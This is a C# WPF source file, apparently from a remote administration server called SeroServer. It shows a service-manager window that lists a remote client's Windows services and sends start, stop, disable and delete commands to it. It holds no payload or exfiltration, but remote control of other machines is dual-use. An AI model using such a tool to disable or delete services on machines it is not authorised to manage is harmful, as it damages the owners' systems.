using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Runtime.CompilerServices;
using System.Windows;
using System.Windows.Data;
using System.Windows.Media;
using System.Windows.Threading;
using DevExpress.Xpf.Core;
using Newtonsoft.Json;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public class ServiceEntryVM : INotifyPropertyChanged
{
    public event PropertyChangedEventHandler? PropertyChanged;
    private void Notify([CallerMemberName] string? p = null)
        => PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(p));

    public string Name        { get; set; } = "";
    public string DisplayName { get; set; } = "";
    public string Description { get; set; } = "";
    public string StartType   { get; set; } = "";
    public string LogOnAs     { get; set; } = "";

    private string _status = "";
    public string Status
    {
        get => _status;
        set { _status = value; Notify(); Notify(nameof(StatusColor)); Notify(nameof(StatusDot)); Notify(nameof(StartTypeColor)); }
    }

    public Brush StatusColor => _status switch
    {
        "Running" => _green,
        "Stopped" => _dim,
        _         => _amber,
    };

    public string StatusDot => _status switch
    {
        "Running" => "●",
        "Stopped" => "○",
        _         => "◌",
    };

    public Brush StartTypeColor => StartType switch
    {
        "Auto"     => _blue,
        "Disabled" => _red,
        _          => _muted,
    };

    public static System.Windows.Media.ImageSource? SvcIcon { get; } = LoadSvcIcon();
    private static System.Windows.Media.ImageSource? LoadSvcIcon()
    {
        var p = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "services.msc");
        return ShellIcon.GetFromPath(p);
    }

    private static readonly Brush _green = Freeze(new SolidColorBrush(Color.FromRgb(0x22, 0xC5, 0x5E)));
    private static readonly Brush _dim   = Freeze(new SolidColorBrush(Color.FromRgb(0x80, 0x90, 0xB0)));
    private static readonly Brush _amber = Freeze(new SolidColorBrush(Color.FromRgb(0xF5, 0x9E, 0x0B)));
    private static readonly Brush _blue  = Freeze(new SolidColorBrush(Color.FromRgb(0x4A, 0x85, 0xF5)));
    private static readonly Brush _red   = Freeze(new SolidColorBrush(Color.FromRgb(0xEF, 0x44, 0x44)));
    private static readonly Brush _muted = Freeze(new SolidColorBrush(Color.FromRgb(0x80, 0x90, 0xB4)));
    private static SolidColorBrush Freeze(SolidColorBrush b) { b.Freeze(); return b; }
}

public partial class ServiceManagerWindow : ThemedWindow
{
    private readonly TlsServer _server;
    private readonly string    _clientId;
    private readonly ObservableCollection<ServiceEntryVM> _services = [];
    private ICollectionView? _view;
    private readonly DispatcherTimer _autoRefresh;
    private int _countdown = 30;

    public ServiceManagerWindow(TlsServer server, string clientId, string label)
    {
        InitializeComponent();
        RubberBandSelector.Enable(GridServices);
        _server   = server;
        _clientId = clientId;
        TxtTitle.Text = label;

        _view = CollectionViewSource.GetDefaultView(_services);
        _view.Filter = Filter;
        GridServices.ItemsSource = _view;

        TxtSearch.TextChanged += (_, _) => _view?.Refresh();

        _autoRefresh = new DispatcherTimer { Interval = TimeSpan.FromSeconds(1) };
        _autoRefresh.Tick += AutoRefreshTick;

        _server.RegisterHandler(clientId, PacketType.SvcListResult, OnList);
        _server.RegisterHandler(clientId, PacketType.SvcAck,        OnAck);
        Lang.LanguageChanged += ApplyLanguage;
        ApplyLanguage();
        Closed += (_, _) =>
        {
            _autoRefresh.Stop();
            _server.UnregisterHandler(clientId, PacketType.SvcListResult);
            _server.UnregisterHandler(clientId, PacketType.SvcAck);
            Lang.LanguageChanged -= ApplyLanguage;
        };

        _autoRefresh.Start();

        Refresh();
    }

    private void ApplyLanguage()
    {
        Title = Lang.Get("FEAT_SERVICE_MGR");
        if (TxtBtnRefreshSvc  != null) TxtBtnRefreshSvc.Text   = Lang.Get("ACT_REFRESH");
        if (TxtSvcSearchHint  != null) TxtSvcSearchHint.Text   = Lang.Get("SVC_SEARCH_HINT");
        if (ColSvcName        != null) ColSvcName.Header        = Lang.Get("WIN_COL_NAME");
        if (ColSvcDesc        != null) ColSvcDesc.Header        = Lang.Get("SVC_COL_DESC");
        if (ColSvcStatus      != null) ColSvcStatus.Header      = Lang.Get("COL_STATUS");
        if (ColSvcStartType   != null) ColSvcStartType.Header   = Lang.Get("SVC_COL_STARTUP");
        if (ColSvcLogOn       != null) ColSvcLogOn.Header       = Lang.Get("SVC_COL_LOGON");
        if (MnuSvcStart       != null) MnuSvcStart.Header       = Lang.Get("ACT_START");
        if (MnuSvcStop        != null) MnuSvcStop.Header        = Lang.Get("ACT_STOP");
        if (MnuSvcRestart     != null) MnuSvcRestart.Header     = Lang.Get("ACT_RESTART");
        if (MnuSvcDisable     != null) MnuSvcDisable.Header     = Lang.Get("ACT_DISABLE");
        if (MnuSvcDelete      != null) MnuSvcDelete.Header      = Lang.Get("ACT_DELETE");
        if (MnuSvcCopyName    != null) MnuSvcCopyName.Header    = Lang.Get("ACT_COPY_NAME");
        if (MnuSvcRefresh     != null) MnuSvcRefresh.Header     = Lang.Get("ACT_REFRESH");
    }

    private bool Filter(object obj)
    {
        if (string.IsNullOrWhiteSpace(TxtSearch.Text)) return true;
        if (obj is not ServiceEntryVM vm) return false;
        var q = TxtSearch.Text.Trim();
        return vm.DisplayName.Contains(q, StringComparison.OrdinalIgnoreCase)
            || vm.Name.Contains(q, StringComparison.OrdinalIgnoreCase)
            || vm.Description.Contains(q, StringComparison.OrdinalIgnoreCase);
    }

    private void AutoRefreshTick(object? sender, EventArgs e)
    {
        _countdown--;
        TxtCountdown.Text = string.Format(Lang.Get("SVC_AUTOREFRESH"), _countdown);
        if (_countdown <= 0)
        {
            _countdown = 30;
            Refresh();
        }
    }

    private void Refresh()
    {
        _countdown = 30;
        TxtStatus.Text = Lang.Get("STATUS_REFRESHING");
        _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.SvcGetList });
    }

    private void OnList(Packet pkt)
    {
        var d = JsonConvert.DeserializeObject<SvcListResultData>(pkt.Data);
        if (d == null) return;
        Dispatcher.BeginInvoke(() =>
        {
            _services.Clear();
            foreach (var s in d.Services)
                _services.Add(new ServiceEntryVM
                {
                    Name        = s.Name,
                    DisplayName = s.DisplayName.Length > 0 ? s.DisplayName : s.Name,
                    Status      = s.Status,
                    StartType   = s.StartType,
                    Description = s.Description,
                    LogOnAs     = s.LogOnAs,
                });
            TxtCount.Text  = $"({d.Services.Count})";
            TxtStatus.Text = string.Format(Lang.Get("SVC_UPDATED"), DateTime.Now.ToString("HH:mm:ss"), d.Services.Count);
        });
    }

    private void OnAck(Packet pkt)
    {
        var d = JsonConvert.DeserializeObject<SvcAckData>(pkt.Data);
        if (d == null) return;
        Dispatcher.BeginInvoke(() =>
        {
            TxtStatus.Text = d.Success ? Lang.Get("SVC_ACK_OK") : $"Error: {d.Error}";
            if (d.Success) Refresh();
        });
    }

    private void SendAction(PacketType type)
    {
        var sel = GridServices.SelectedItems.Cast<ServiceEntryVM>().ToList();
        if (sel.Count == 0) return;
        string label = type switch
        {
            PacketType.SvcStart   => Lang.Get("ACT_START"),
            PacketType.SvcStop    => Lang.Get("ACT_STOP"),
            PacketType.SvcRestart => Lang.Get("ACT_RESTART"),
            PacketType.SvcDisable => Lang.Get("ACT_DISABLE"),
            PacketType.SvcDelete  => Lang.Get("ACT_DELETE"),
            _ => type.ToString()
        };
        string labelEn = type switch
        {
            PacketType.SvcStart   => "Start",
            PacketType.SvcStop    => "Stop",
            PacketType.SvcRestart => "Restart",
            PacketType.SvcDisable => "Disable",
            PacketType.SvcDelete  => "Delete",
            _ => type.ToString()
        };
        var destructive = type is PacketType.SvcStop or PacketType.SvcRestart or PacketType.SvcDisable or PacketType.SvcDelete;
        if (destructive)
        {
            string msg = sel.Count == 1
                ? string.Format(Lang.Get("SVC_CONFIRM_1"), label, sel[0].DisplayName)
                : string.Format(Lang.Get("SVC_CONFIRM_N"), label, sel.Count);
            if (MessageBox.Show(msg, Lang.Get("MSG_CONFIRM"), MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
        }
        foreach (var vm in sel)
            _ = _server.SendToClient(_clientId, new Packet { Type = type, Data = JsonConvert.SerializeObject(new SvcActionData { ServiceName = vm.Name }) });
        TxtStatus.Text = sel.Count == 1 ? $"{label} → {sel[0].DisplayName}…" : $"{label} → {sel.Count}…";
        ServerWindow.ReportGlobalActivity($"{labelEn} service", sel.Count == 1 ? sel[0].DisplayName : $"{sel.Count} services", "complete");
        ServerWindow.LogGlobal($"[SVC] Sent {labelEn} command for {(sel.Count == 1 ? $"service '{sel[0].DisplayName}'" : $"{sel.Count} services")} on client {_clientId}.");
    }

    private void BtnRefresh_Click(object s, RoutedEventArgs e) => Refresh();
    private void BtnStart_Click  (object s, RoutedEventArgs e) => SendAction(PacketType.SvcStart);
    private void BtnStop_Click   (object s, RoutedEventArgs e) => SendAction(PacketType.SvcStop);
    private void BtnRestart_Click(object s, RoutedEventArgs e) => SendAction(PacketType.SvcRestart);
    private void BtnDisable_Click(object s, RoutedEventArgs e) => SendAction(PacketType.SvcDisable);
    private void BtnDelete_Click (object s, RoutedEventArgs e) => SendAction(PacketType.SvcDelete);

    private void GridServices_CopyName_Click(object s, RoutedEventArgs e)
    {
        if (GridServices.SelectedItem is ServiceEntryVM vm)
            try { System.Windows.Clipboard.SetText(vm.Name); TxtStatus.Text = $"Copied: {vm.DisplayName}"; } catch { }
    }

    private void Close_Click(object s, RoutedEventArgs e) => Close();

    private void GridServices_ContextMenuOpening(object sender, System.Windows.Controls.ContextMenuEventArgs e)
    {
        if (GridServices.SelectedItems.Count == 0) e.Handled = true;
    }
}
